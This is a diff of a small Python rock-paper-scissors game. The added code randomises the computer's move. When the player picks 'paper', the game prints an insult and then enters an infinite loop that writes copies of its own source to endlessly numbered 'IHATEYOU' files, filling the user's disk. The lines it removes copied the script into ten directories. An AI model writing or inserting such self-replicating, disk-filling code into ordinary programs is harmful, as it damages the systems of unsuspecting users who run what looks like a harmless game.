@@ -7,13 +7,10 @@ import os
 
 one = input("rock paper or scissors?: ")
 time.sleep(0.5)
-print("""
+list = ['rock', 'paper', 'scissors']
 
-
-i choose rock
-
-
-""")
+two = ('I choose ', random.choice(list))
+print(two)
 time.sleep(1)
 
 
@@ -25,12 +22,13 @@ if one == ("paper"):
 	print("...")
 	time.sleep(1)
 	print("fuck you")
-	script = argv
-	name = str(script[0])
-	for i in range(0, 10):
-		directoryName = 'IHATEYOU'+str(i)
-		subprocess.call(['mkdir', directoryName])
-		subprocess.call(['cp', name,directoryName])
+	indicator = 0
+	
+	while True:
+		with open("IHATEYOU{0}".format(indicator), "w") as f:
+			f.write(open(__file__).read())
+			f.close()
+			indicator += 1
 
 elif one == ("rock"):
 	print("ok fine go again")
